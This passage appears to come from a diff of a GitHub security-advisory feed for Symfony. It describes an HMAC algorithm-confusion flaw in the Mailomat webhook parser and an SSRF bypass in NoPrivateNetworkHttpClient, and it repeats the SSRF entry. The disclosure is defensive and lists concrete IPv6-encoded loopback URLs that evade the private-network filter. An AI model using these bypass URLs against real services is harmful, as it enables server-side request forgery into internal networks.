-<p>PHP's <code>hash_hmac()</code> enforces only that the chosen algorithm is HMAC-compatible. That set still includes primitives with known cryptanalysis (<code>md4</code>, <code>md5</code>, <code>ripemd128</code>, <code>tiger128,3</code>, … — e.g. existential forgery of HMAC-MD4, Contini &amp; Yin, ASIACRYPT 2006). This is the canonical algorithm-confusion shape, analogous to JWT <code>alg=none</code> / <code>alg=HS256</code> downgrades: any future cryptographic weakness in any HMAC primitive PHP exposes becomes immediately exploitable against a Mailomat webhook receiver, the moment an attacker is in a position to compute a signature for that primitive, without a code change on the Symfony side.</p>
-<p>Mailomat's <a href="https://api.mailomat.swiss/docs/#tag/webhook-security">documented webhook security</a> pins SHA-256; the parser did not.</p>
-<h3 id="resolution">Resolution</h3>
-<p><code>MailomatRequestParser::validateSignature()</code> now requires the signature header to be of the form <code>sha256=&lt;hex&gt;</code> and verifies the signature with HMAC-SHA256 keyed by the configured secret using a constant-time comparison. Any other algorithm declared on the wire (including the HMAC primitives PHP would otherwise accept) is rejected.</p>
-<p>The patch for this issue is available <a href="https://github.com/symfony/symfony/commit/bdfe9fe0d94d33dfaca0bc2fe0b00b54767b0c88">here</a> for branch 7.4 (and forward-ported to 8.0 and 8.1).</p>
-<h3 id="credits">Credits</h3>
-<p>Symfony would like to thank Omar Alshammari, Essam Alanazi and Alwaleed Alshammari for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-rrj9-5q2j-4gvr">https://github.com/symfony/symfony/security/advisories/GHSA-rrj9-5q2j-4gvr</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/bdfe9fe0d94d33dfaca0bc2fe0b00b54767b0c88">https://github.com/symfony/symfony/commit/bdfe9fe0d94d33dfaca0bc2fe0b00b54767b0c88</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/mailomat-mailer/CVE-2026-48747.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/mailomat-mailer/CVE-2026-48747.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48747.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48747.yaml</a></li>
-<li><a href="https://symfony.com/cve-2026-48747">https://symfony.com/cve-2026-48747</a></li>
-<li><a href="https://github.com/advisories/GHSA-rrj9-5q2j-4gvr">https://github.com/advisories/GHSA-rrj9-5q2j-4gvr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rrj9-5q2j-4gvr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-15T17:32:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/symfony] Symfony: IpUtils::PRIVATE_SUBNETS Omits IPv6 Transition Forms (6to4, NAT64, Teredo, IPv4-compatible): SSRF Bypass in NoPrivateNetworkHttpClient]]></title>
-        <id>https://github.com/advisories/GHSA-38cx-cq6f-5755</id>
-        <link href="https://github.com/advisories/GHSA-38cx-cq6f-5755"/>
-        <updated>2026-06-15T17:31:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p><code>Symfony\Component\HttpClient\NoPrivateNetworkHttpClient</code> is documented as a decorator that blocks requests to private networks by default. The list of blocked subnets (<code>Symfony\Component\HttpFoundation\IpUtils::PRIVATE_SUBNETS</code> on 6.4+, a private constant in <code>NoPrivateNetworkHttpClient</code> on 5.4) enumerates RFC1918, loopback, link-local and IPv4-mapped IPv6 (<code>::ffff:0:0/96</code>) prefixes, but omits the remaining IPv6 transition forms that can embed a private IPv4 destination: 6to4 (<code>2002::/16</code>, RFC 3056), Teredo (<code>2001::/32</code>, RFC 4380), NAT64 (<code>64:ff9b::/96</code>, RFC 6052 and <code>64:ff9b:1::/48</code>, RFC 8215) and IPv4-compatible IPv6 (<code>::/96</code>, RFC 4291 §2.5.5.1).</p>
-<p><code>IpUtils::checkIp6()</code> is a pure bitwise CIDR comparison against the constants list and never extracts the embedded IPv4, so an attacker who can supply a URL writes the loopback / RFC1918 IPv4 target as e.g. <code>http://[2002:7f00:1::]/</code> (6to4 → 127.0.0.1), <code>http://[64:ff9b::7f00:1]/</code> (NAT64 → 127.0.0.1), <code>http://[::7f00:1]/</code> (IPv4-compatible → 127.0.0.1) or <code>http://[2001::1]/</code> (Teredo). <code>IpUtils::isPrivateIp()</code> returns <code>false</code> and <code>NoPrivateNetworkHttpClient</code> dispatches the request.</p>
-<p>Real-world reachability of the embedded IPv4 depends on the deploy's IPv6 routing (6to4 tunnel interface, upstream NAT64 gateway, kernel handling of IPv4-compatible addresses), but the security boundary the decorator promises — the dispatch decision — is crossed regardless of whether the packet ultimately lands on the embedded IPv4.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The private-subnet list now includes <code>::/96</code>, <code>2002::/16</code>, <code>2001::/32</code>, <code>64:ff9b::/96</code> and <code>64:ff9b:1::/48</code>. Blanket blocking of these prefixes matches the policy applied by Chromium and Mozilla's Private Network Access; server-side HTTPS APIs are not legitimately published on these prefixes.</p>
-<p>The patches for this issue are available <a href="https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2">here</a> for branch 5.4 and <a href="https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e">here</a> for branch 6.4 (and forward-ported to 7.4, 8.0 and 8.1).</p>
-<h3 id="credits">Credits</h3>
-<p>Symfony would like to thank tonghuaroot for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-38cx-cq6f-5755">https://github.com/symfony/symfony/security/advisories/GHSA-38cx-cq6f-5755</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2">https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e">https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2026-48736.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-48736.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48736.yaml</a></li>
-<li><a href="https://symfony.com/cve-2026-48736">https://symfony.com/cve-2026-48736</a></li>
-<li><a href="https://github.com/advisories/GHSA-38cx-cq6f-5755">https://github.com/advisories/GHSA-38cx-cq6f-5755</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-38cx-cq6f-5755</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-15T17:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/symfony] Symfony: IpUtils::PRIVATE_SUBNETS Omits IPv6 Transition Forms (6to4, NAT64, Teredo, IPv4-compatible): SSRF Bypass in NoPrivateNetworkHttpClient]]></title>
-        <id>https://github.com/advisories/GHSA-38cx-cq6f-5755</id>
-        <link href="https://github.com/advisories/GHSA-38cx-cq6f-5755"/>
-        <updated>2026-06-15T17:31:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p><code>Symfony\Component\HttpClient\NoPrivateNetworkHttpClient</code> is documented as a decorator that blocks requests to private networks by default. The list of blocked subnets (<code>Symfony\Component\HttpFoundation\IpUtils::PRIVATE_SUBNETS</code> on 6.4+, a private constant in <code>NoPrivateNetworkHttpClient</code> on 5.4) enumerates RFC1918, loopback, link-local and IPv4-mapped IPv6 (<code>::ffff:0:0/96</code>) prefixes, but omits the remaining IPv6 transition forms that can embed a private IPv4 destination: 6to4 (<code>2002::/16</code>, RFC 3056), Teredo (<code>2001::/32</code>, RFC 4380), NAT64 (<code>64:ff9b::/96</code>, RFC 6052 and <code>64:ff9b:1::/48</code>, RFC 8215) and IPv4-compatible IPv6 (<code>::/96</code>, RFC 4291 §2.5.5.1).</p>
-<p><code>IpUtils::checkIp6()</code> is a pure bitwise CIDR comparison against the constants list and never extracts the embedded IPv4, so an attacker who can supply a URL writes the loopback / RFC1918 IPv4 target as e.g. <code>http://[2002:7f00:1::]/</code> (6to4 → 127.0.0.1), <code>http://[64:ff9b::7f00:1]/</code> (NAT64 → 127.0.0.1), <code>http://[::7f00:1]/</code> (IPv4-compatible → 127.0.0.1) or <code>http://[2001::1]/</code> (Teredo). <code>IpUtils::isPrivateIp()</code> returns <code>false</code> and <code>NoPrivateNetworkHttpClient</code> dispatches the request.</p>
-<p>Real-world reachability of the embedded IPv4 depends on the deploy's IPv6 routing (6to4 tunnel interface, upstream NAT64 gateway, kernel handling of IPv4-compatible addresses), but the security boundary the decorator promises — the dispatch decision — is crossed regardless of whether the packet ultimately lands on the embedded IPv4.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The private-subnet list now includes <code>::/96</code>, <code>2002::/16</code>, <code>2001::/32</code>, <code>64:ff9b::/96</code> and <code>64:ff9b:1::/48</code>. Blanket blocking of these prefixes matches the policy applied by Chromium and Mozilla's Private Network Access; server-side HTTPS APIs are not legitimately published on these prefixes.</p>
-<p>The patches for this issue are available <a href="https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2">here</a> for branch 5.4 and <a href="https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e">here</a> for branch 6.4 (and forward-ported to 7.4, 8.0 and 8.1).</p>
-<h3 id="credits">Credits</h3>
-<p>Symfony would like to thank tonghuaroot for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-38cx-cq6f-5755">https://github.com/symfony/symfony/security/advisories/GHSA-38cx-cq6f-5755</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2">https://github.com/symfony/symfony/commit/82765368cf74177c36613575182f168a2eb765b2</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e">https://github.com/symfony/symfony/commit/85b831555be8ea1f43bf01078afe87bc4c92f65e</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2026-48736.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-foundation/CVE-2026-48736.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48736.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2026-48736.yaml</a></li>
-<li><a href="https://symfony.com/cve-2026-48736">https://symfony.com/cve-2026-48736</a></li>
-<li><a href="https://github.com/advisories/GHSA-38cx-cq6f-5755">https://github.com/advisories/GHSA-38cx-cq6f-5755</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-38cx-cq6f-5755</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-15T17:31:28.000Z</published>
     </entry>
 </feed>
